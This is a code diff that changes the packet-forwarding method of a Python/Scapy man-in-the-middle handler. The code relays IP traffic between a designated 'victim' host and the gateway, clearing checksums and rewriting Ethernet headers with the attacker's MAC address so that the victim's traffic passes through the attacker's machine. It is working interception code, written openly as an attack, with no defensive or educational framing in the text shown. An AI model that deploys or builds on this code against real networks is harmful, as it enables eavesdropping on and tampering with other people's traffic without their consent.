@@ -95,52 +95,37 @@ class MitmHandler:
 
     def packet_forwarder(self, packet):
         try:
-            # Run some checks if we even need to forward this packet
-            if not packet.haslayer(Ether):
+            if not packet.haslayer(IP):
                 return
 
-            if packet.haslayer(IP):
-                src_ip = packet[IP].src
-                dst_ip = packet[IP].dst
-            elif packet.haslayer(IPv6):
-                src_ip = packet[IPv6].src
-                dst_ip = packet[IPv6].dst
+            ip_pkt = packet[IP].copy()
+
+            # Clear checksums / length
+            del ip_pkt.len
+            del ip_pkt.chksum
+
+            if ip_pkt.haslayer(TCP):
+                del ip_pkt[TCP].chksum
+            if ip_pkt.haslayer(UDP):
+                del ip_pkt[UDP].chksum
+
+            # From victim to gateway
+            if ip_pkt.src == self.victim_ip:
+                ether = Ether(
+                    src=self.attacker_mac,
+                    dst=self.gateway_mac
+                )
+
+            # From gateway to victim
+            elif ip_pkt.dst == self.victim_ip:
+                ether = Ether(
+                    src=self.attacker_mac,
+                    dst=self.victim_mac
+                )
             else:
                 return
 
-            # If we are the destination, ignore.
-            if (dst_ip == self.attacker_ip) or (self.attacker_ipv6 and dst_ip == self.attacker_ipv6):
-                return
-
-            pkt = packet.copy()
-
-            # Clear checksums before forwarding
-            if pkt.haslayer(IP):
-                del pkt[IP].chksum
-                del pkt[IP].len
-
-            if pkt.haslayer(TCP):
-                del pkt[TCP].chksum
-            if pkt.haslayer(UDP):
-                del pkt[UDP].chksum
-            forwarded = False
-
-            # From victim to gateway
-            if src_ip == self.victim_ip:
-                # Pretend that we sent the packet, and send it to the gateway
-                pkt[Ether].dst = self.gateway_mac
-                pkt[Ether].src = self.attacker_mac
-                forwarded = True
-
-            # From gateway to the victim
-            elif dst_ip == self.victim_ip:
-                # Pretend that we sent the packet, and send it to the victim
-                pkt[Ether].dst = self.victim_mac
-                pkt[Ether].src = self.attacker_mac
-                forwarded = True
-
-            if forwarded:
-                sc.sendp(pkt, verbose=0, iface=self.interface)
+            sc.sendp(ether / ip_pkt, iface=self.interface, verbose=False)
 
         except Exception as e:
-            self.logger(f"{e}")
+            self.logger(f"MITM Handler exception: {e}")
